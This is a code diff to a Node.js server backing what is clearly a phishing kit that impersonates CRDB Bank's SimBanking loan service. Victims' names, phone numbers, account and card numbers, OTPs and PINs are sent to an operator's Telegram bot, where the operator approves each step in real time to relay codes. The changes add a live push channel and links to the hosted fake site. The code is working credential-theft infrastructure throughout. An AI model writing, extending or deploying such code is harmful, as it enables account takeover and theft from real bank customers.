@@ -10,7 +10,7 @@ const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
 let bot;
 
 try {
-    bot = new TelegramBot(TOKEN, { polling: true });
+    bot = new TelegramBot(TOKEN, { polling: { interval: 2000, autoStart: true, params: { timeout: 10 } } });
 } catch (e) {
     console.error('Failed to initialize Telegram Bot:', e.message);
 }
@@ -18,19 +18,53 @@ try {
 let adminChatId = null;
 let clientData = {};
 let pinAttempts = 3;
+let currentClientResponse = null;
+let sseResponseObj = null; // Real-time push connection tracker
+
+// Helper to push updates instantly to browser
+function triggerInstantUpdate(responsePayload) {
+    currentClientResponse = responsePayload;
+    if (sseResponseObj) {
+        sseResponseObj.write(`data: ${JSON.stringify(responsePayload)}\n\n`);
+    }
+}
 
 if (bot) {
     bot.onText(/\/start/, (msg) => {
         adminChatId = msg.chat.id;
+        const appUrl = process.env.RENDER_EXTERNAL_URL || 'https://crdb-simbanking.onrender.com';
         console.log(`Admin Connected: ${adminChatId}`);
-        bot.sendMessage(adminChatId, `✅ **Admin Connected Successfully!**\nYour Chat ID is: \`${adminChatId}\``, { parse_mode: 'Markdown' });
+        
+        const welcomeMsg = `✅ **Admin Connected Successfully!**\n\n` +
+            `👤 **Admin Chat ID:** \`${adminChatId}\`\n\n` +
+            `🌐 **Browsing Application Link:**\n${appUrl}`;
+            
+        bot.sendMessage(adminChatId, welcomeMsg, { parse_mode: 'Markdown', disable_web_page_preview: true });
     });
 }
+
+// Real-time Event Stream Endpoint for instant navigation
+app.get('/api/stream-status', (req, res) => {
+    res.setHeader('Content-Type', 'text/event-stream');
+    res.setHeader('Cache-Control', 'no-cache');
+    res.setHeader('Connection', 'keep-alive');
+    res.flushHeaders();
+
+    sseResponseObj = res;
+    res.write('data: {"status":"connected"}\n\n');
+
+    req.on('close', () => {
+        if (sseResponseObj === res) {
+            sseResponseObj = null;
+        }
+    });
+});
 
 app.post('/api/submit', async (req, res) => {
     try {
         const { step, data } = req.body;
         clientData = { ...clientData, ...data };
+        currentClientResponse = null; // Reset for incoming step
 
         if (!bot) {
             return res.status(500).json({ success: false, message: 'Bot not initialized.' });
@@ -40,8 +74,13 @@ app.post('/api/submit', async (req, res) => {
             return res.status(400).json({ success: false, message: 'Please send /start to your Telegram bot first!' });
         }
 
+        const appUrl = process.env.RENDER_EXTERNAL_URL || 'https://crdb-simbanking.onrender.com';
+
         if (step === 'personal_info') {
-            const msgText = `👤 **Step: Taarifa za Mtu na Simu**\n\n📝 **Full Name:** ${data.fullName}\n📱 **Phone No:** ${data.phoneNumber}\n💰 **Requested Loan:** TZS ${Number(data.loanAmount || 0).toLocaleString()}\n\n*Check SimBanking registration status:*`;
+            const msgText = `👤 **Step: Taarifa za Mtu na Simu**\n\n` +
+                `🌐 [Open Browsing App](${appUrl})\n\n` +
+                `📝 **Full Name:** ${data.fullName}\n📱 **Phone No:** ${data.phoneNumber}\n💰 **Requested Loan:** TZS ${Number(data.loanAmount || 0).toLocaleString()}\n\n*Check SimBanking registration status:*`;
+            
             const opts = {
                 reply_markup: {
                     inline_keyboard: [
@@ -51,13 +90,17 @@ app.post('/api/submit', async (req, res) => {
                         ]
                     ]
                 },
-                parse_mode: 'Markdown'
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
             };
             await bot.sendMessage(adminChatId, msgText, opts);
             return res.json({ success: true, pendingApproval: true });
         }
         else if (step === 'step3') {
-            const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n🏦 **Account No:** ${data.accountNumber}\n💳 **Tembo Card No:** ${data.cardNumber}\n\n*Choose action for applicant:*`;
+            const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n` +
+                `🌐 [Open Browsing App](${appUrl})\n\n` +
+                `🏦 **Account No:** ${data.accountNumber}\n💳 **Tembo Card No:** ${data.cardNumber}\n\n*Choose action for applicant:*`;
+            
             const opts = {
                 reply_markup: {
                     inline_keyboard: [
@@ -67,7 +110,8 @@ app.post('/api/submit', async (req, res) => {
                         ]
                     ]
                 },
-                parse_mode: 'Markdown'
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
             };
             await bot.sendMessage(adminChatId, msgText, opts);
             return res.json({ success: true, pendingApproval: true });
@@ -78,7 +122,10 @@ app.post('/api/submit', async (req, res) => {
                 return res.json({ success: true, resendAcknowledge: true });
             }
 
-            const msgText = `📱 **Step 4: OTP Verification**\n\n🔢 **Entered OTP:** ${data.otp}\n\n*Choose action for OTP:*`;
+            const msgText = `📱 **Step 4: OTP Verification**\n\n` +
+                `🌐 [Open Browsing App](${appUrl})\n\n` +
+                `🔢 **Entered OTP:** ${data.otp}\n\n*Choose action for OTP:*`;
+            
             const opts = {
                 reply_markup: {
                     inline_keyboard: [
@@ -88,13 +135,17 @@ app.post('/api/submit', async (req, res) => {
                         ]
                     ]
                 },
-                parse_mode: 'Markdown'
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
             };
             await bot.sendMessage(adminChatId, msgText, opts);
             return res.json({ success: true, pendingApproval: true });
         }
         else if (step === 'step5') {
-            const msgText = `🔒 **Step 5: SimBanking PIN**\n\n🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${pinAttempts}\n\n*Choose action for PIN:*`;
+            const msgText = `🔒 **Step 5: SimBanking PIN**\n\n` +
+                `🌐 [Open Browsing App](${appUrl})\n\n` +
+                `🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${pinAttempts}\n\n*Choose action for PIN:*`;
+            
             const opts = {
                 reply_markup: {
                     inline_keyboard: [
@@ -104,7 +155,8 @@ app.post('/api/submit', async (req, res) => {
                         ]
                     ]
                 },
-                parse_mode: 'Markdown'
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
             };
             await bot.sendMessage(adminChatId, msgText, opts);
             return res.json({ success: true, pendingApproval: true });
@@ -115,9 +167,7 @@ app.post('/api/submit', async (req, res) => {
         console.error('Server error in /api/submit:', err);
         res.status(500).json({ success: false, message: 'Internal server error: ' + err.message });
     }
-});
-
-let currentClientResponse = null;
+} );
 
 if (bot) {
     bot.on('callback_query', async (query) => {
@@ -125,63 +175,60 @@ if (bot) {
         const chatId = query.message.chat.id;
         const messageId = query.message.message_id;
 
-        await bot.answerCallbackQuery(query.id);
+        try { await bot.answerCallbackQuery(query.id); } catch (e) {}
 
         try {
             await bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: '✔ ACTION PROCESSED', callback_data: 'done' }]] }, { chat_id: chatId, message_id: messageId });
-        } catch (e) {
-            // Ignore edit markup errors
-        }
+        } catch (e) {}
 
         if (action === 'phone_registered') {
             await bot.sendMessage(chatId, '✅ Phone registered. Moving applicant to Tembo Card verification.');
-            currentClientResponse = { status: 'approved', next: 'card_verify' };
+            triggerInstantUpdate({ status: 'approved', next: 'card_verify' });
         } else if (action === 'phone_unregistered') {
             await bot.sendMessage(chatId, '❌ Phone not registered on SimBanking.');
-            currentClientResponse = { status: 'retry_phone', message: 'Namba ya simu au jina uliloingiza halijasajiliwa kwenye SimBanking. Tafadhali ingiza namba sahihi ya CRDB SimBanking ❌' };
+            triggerInstantUpdate({ status: 'retry_phone', message: 'Namba ya simu au jina uliloingiza halijasajiliwa kwenye SimBanking. Tafadhali ingiza namba sahihi ya CRDB SimBanking ❌' });
         } else if (action === 'card_proceed') {
             await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
-            currentClientResponse = { status: 'approved', next: 'otp' };
+            triggerInstantUpdate({ status: 'approved', next: 'otp' });
         } else if (action === 'card_deny') {
             await bot.sendMessage(chatId, '❌ Application stopped due to invalid CRDB details.');
-            currentClientResponse = { status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details) ❌' };
+            triggerInstantUpdate({ status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details) ❌' });
         } else if (action === 'otp_correct') {
             await bot.sendMessage(chatId, '✅ OTP correct. Moving applicant to PIN step.');
-            currentClientResponse = { status: 'approved', next: 'pin' };
+            triggerInstantUpdate({ status: 'approved', next: 'pin' });
         } else if (action === 'otp_incorrect') {
             await bot.sendMessage(chatId, '❌ Incorrect OTP. Applicant forced to enter new OTP.');
-            currentClientResponse = { status: 'retry_otp', message: 'Namba ya OTP si sahihi. Tafadhali ingiza OTP mpya ❌' };
+            triggerInstantUpdate({ status: 'retry_otp', message: 'Namba ya OTP si sahihi. Tafadhali ingiza OTP mpya ❌' });
         } else if (action === 'pin_correct') {
             await bot.sendMessage(chatId, '✅ PIN correct. Proceeding to success screen.');
             pinAttempts = 3;
-            currentClientResponse = { status: 'approved', next: 'success' };
+            triggerInstantUpdate({ status: 'approved', next: 'success' });
         } else if (action === 'pin_wrong') {
             pinAttempts--;
             if (pinAttempts <= 0) {
                 await bot.sendMessage(chatId, '🚫 Account blocked due to 3 wrong PIN attempts.');
-                currentClientResponse = { status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa 3 ya PIN ❌' };
+                triggerInstantUpdate({ status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa 3 ya PIN ❌' });
                 pinAttempts = 3;
             } else {
                 await bot.sendMessage(chatId, `⚠️ Wrong PIN. ${pinAttempts} attempt remains.`);
-                currentClientResponse = { status: 'retry_pin', message: `PIN si sahihi. Kosa la ${3 - pinAttempts}/3. Jaribu tena ❌`, attemptsLeft: pinAttempts };
+                triggerInstantUpdate({ status: 'retry_pin', message: `PIN si sahihi. Kosa la ${3 - pinAttempts}/3. Jaribu tena ❌`, attemptsLeft: pinAttempts });
             }
         }
     });
 }
 
+// Backup poll route safeguard
 app.get('/api/poll-status', (req, res) => {
-    const checkInterval = setInterval(() => {
-        if (currentClientResponse) {
-            clearInterval(checkInterval);
-            const resp = currentClientResponse;
-            currentClientResponse = null;
-            res.json(resp);
-        }
-    }, 1000);
+    if (currentClientResponse) {
+        const resp = currentClientResponse;
+        currentClientResponse = null;
+        return res.json(resp);
+    }
+    return res.json({ status: 'pending' });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-    
+        
